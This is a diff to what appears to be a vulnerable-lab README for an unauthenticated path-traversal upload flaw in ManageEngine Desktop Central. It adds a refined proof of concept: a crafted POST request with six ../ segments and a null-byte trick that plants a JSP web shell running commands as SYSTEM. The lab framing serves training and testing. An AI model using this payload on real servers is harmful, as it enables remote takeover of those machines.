@@ -11,11 +11,11 @@
   `exploit/windows/http/manageengine_connectionid_write`.
 
 ## Description
-Desktop Central's `/agent/connection/download/FileUploadServlet` accepted multipart
-uploads with a `connectionId` parameter that was concatenated into a filesystem path
-without canonicalization or authentication. An attacker supplies a `connectionId`
-containing path-traversal segments and a `.jsp` body; the servlet writes the file to
-a directory served by the bundled Tomcat and the JSP is executed on next request.
+Desktop Central's `FileUploadServlet` accepts unauthenticated uploads and concatenates
+the caller-supplied `connectionId` parameter into a filesystem path without
+canonicalization. An attacker supplies a `connectionId` containing path-traversal
+segments and a `.jsp` body; the servlet writes the request body to a directory served
+by the bundled Tomcat and the JSP is executed on next request.
 
 The Rapid7 mirror this image installs from serves a version-less object; what it
 actually lays down reports `buildnumber=91084` in `conf\product.conf`, sixteen builds
@@ -33,21 +33,35 @@ behind the fix (91100). The admin console is left on 8020/TCP bound to `0.0.0.0`
   service state, is what is graded.
 - **Ports:** 8020/TCP (admin UI, via the bundled Apache), 8027/TCP (notification
   server). The 8040/TCP agent channel is not bound in this build.
-- **Vulnerable endpoint:** `POST /agent/connection/download/FileUploadServlet?connectionId=...`
-  (also reachable as `POST /fileupload?connectionId=...`)
+- **Vulnerable endpoint:** `POST /fileupload?connectionId=...` — this is the real
+  mapping. `webapps\DesktopCentral\WEB-INF\web.xml` binds `<url-pattern>/fileupload`
+  to `com.adventnet.sym.webclient.common.FileUploadServlet`; the
+  `/agent/connection/download/FileUploadServlet` path quoted by some CVE write-ups is
+  **404 here**.
 
 ## Proof
+`doPost` reads five parameters, and all five matter: `customerId` goes through
+`Long.parseLong`, so a request that omits it throws before anything is written, and
+`getFileFolderPath()` only produces a path when `action` is `rds_file_upload`. The
+request body is copied straight from `request.getInputStream()` — it is never parsed
+as multipart, so no MIME framing is required.
+
 ```
-POST /agent/connection/download/FileUploadServlet?connectionId=../../../../webapps/DesktopCentral/shell.jsp HTTP/1.1
+POST /fileupload?connectionId=../../../../../../shell.jsp%00&resourceId=1&action=rds_file_upload&computerName=X&customerId=1 HTTP/1.1
 Host: <target>:8020
-Content-Type: multipart/form-data; boundary=---X
+Content-Type: application/octet-stream
 Content-Length: ...
 
------X
-Content-Disposition: form-data; name="file"; filename="shell.jsp"
 <%@ page import="java.util.*,java.io.*"%><% Runtime.getRuntime().exec(request.getParameter("c")); %>
------X--
 ```
+The servlet writes to
+`<serverDataDir>\rds\scr-rec\<user>-<computerName>-<connectionId>.7z`. Because
+`<user>-<computerName>-` is glued to the front of `connectionId`, the first `../`
+only cancels that prefix, so **six** are needed to climb out of
+`webapps\DesktopCentral\server-data\<customerId>\rds\scr-rec` into
+`webapps\DesktopCentral`. The trailing `.7z` is truncated by the bundled JRE's
+null byte handling, so the file lands as a real `.jsp`.
+
 Then `GET /shell.jsp?c=whoami` runs as `NT AUTHORITY\SYSTEM`.
 
 ## Remediation Steps
